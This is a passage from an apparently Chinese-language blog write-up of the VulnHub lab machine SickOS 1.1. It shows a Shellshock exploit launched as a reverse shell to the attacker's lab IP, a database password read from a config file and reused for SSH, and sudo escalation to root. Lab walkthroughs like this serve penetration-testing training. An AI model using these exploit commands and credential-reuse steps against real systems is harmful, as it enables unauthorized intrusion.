+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit shellshock apache</span><br>-------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                            |  Path<br>-------------------------------------------------------------------------- ---------------------------------<br>Apache mod_cgi - &#x27;Shellshock&#x27; Remote Command Injection                    | linux/remote/34900.py<br>-------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/linux/remote/34900.py</span>                     <br>[......]<br><br>Usage:<br>./exploit.py var=&lt;value&gt;<br><br>Vars:<br>rhost: victim host<br>rport: victim port for TCP shell binding<br>lhost: attacker host for TCP shell reversing<br>lport: attacker port for TCP shell reversing<br>pages:  specific cgi vulnerable pages (separated by comma)<br>proxy: host:port proxy<br><br>Payloads:<br>&quot;reverse&quot; (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)<br>&quot;bind&quot; (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)<br><br>Example:<br><br>./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234<br>./exploit.py payload=bind rhost=1.2.3.4 rport=1234<br><br>[......]<br></code></pre></td></tr></table></figure>
+<p>利用：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python exp.py payload=reverse rhost=192.168.135.157 lhost=192.168.135.141 lport=4444 proxy=192.168.135.157:3128 pages=/cgi-bin/status/</span><br></code></pre></td></tr></table></figure>
+<h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><p>查看用户和目录下文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls /home</span><br>sickos<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">pwd</span></span><br>/<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /var/www/html</span><br>/bin/sh: 4: cd: can&#x27;t cd to /var/www/html<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /varwww/wolfcms</span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>CONTRIBUTING.md<br>README.md<br>composer.json<br>config.php<br>docs<br>favicon.ico<br>index.php<br>public<br>robots.txt<br>wolf<br><span class="hljs-meta">$</span><span class="bash"> cat config.php</span><br>&lt;?php <br><br>// Database information:<br>// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)<br>// The path can only be absolute path or :memory:<br>// For more info look at: www.php.net/pdo<br><br>// Database settings:<br>define(&#x27;DB_DSN&#x27;, &#x27;mysql:dbname=wolf;host=localhost;port=3306&#x27;);<br>define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);<br>define(&#x27;DB_PASS&#x27;, &#x27;john@123&#x27;);<br>define(&#x27;TABLE_PREFIX&#x27;, &#x27;&#x27;);<br></code></pre></td></tr></table></figure>
+<p>得到系统用户：sickos ；数据库账号：root，密码：john@123</p>
+<p>尝试SSH撞库：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh sickos@192.168.135.157</span><br>sickos@192.168.135.157&#x27;s password: <br>Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)<br>sickos@SickOs:~$ whoami<br>sickos<br>sickos@SickOs:~$ id<br>uid=1000(sickos) gid=1000(sickos) groups=1000(sickos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)<br></code></pre></td></tr></table></figure>
+<p>成功拿到 sickos 用户权限，发现此用户拥有 sudo 权限，直接 sudo su 提权：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">sickos@SickOs:~$ sudo -l<br>[sudo] password for sickos: <br>Matching Defaults entries for sickos on this host:<br>    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User sickos may run the following commands on this host:<br>    (ALL : ALL) ALL<br>sickos@SickOs:~$ sudo su<br>root@SickOs:/home/sickos# whoami<br>root<br>root@SickOs:/home/sickos# ls /root<br>a0216ea4d51874464078c618298b1367.txt<br>root@SickOs:/home/sickos# cat /root/a0216ea4d51874464078c618298b1367.txt<br>If you are viewing this!!<br>ROOT!<br>You have Succesfully completed SickOS1.1.<br>Thanks for Trying<br></code></pre></td></tr></table></figure>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ol>
+<li>端口代理服务</li>
+<li>目录扫描：robots.txt</li>
+<li>nikto 扫描：shellshock</li>
+<li>wolfcms：后台登录页面、弱口令登录、后台文件上传</li>
+<li>配置文件：数据库账号密码</li>
+<li>SSH撞库</li>
+<li>sudo提权</li>
+</ol>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Penetration/">Penetration</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
+                    
+                      <a class="hover-with-bg" href="/tags/vulnhub/">vulnhub</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/07/10/Penetration/Vulnhub/Part-1/0x0B%20Raven-2/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Raven：2</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/07/07/CTF/Pwn/Linux-Buffer-Overflow/">
+                        <span class="hidden-mobile">Linux Buffer Overflow</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
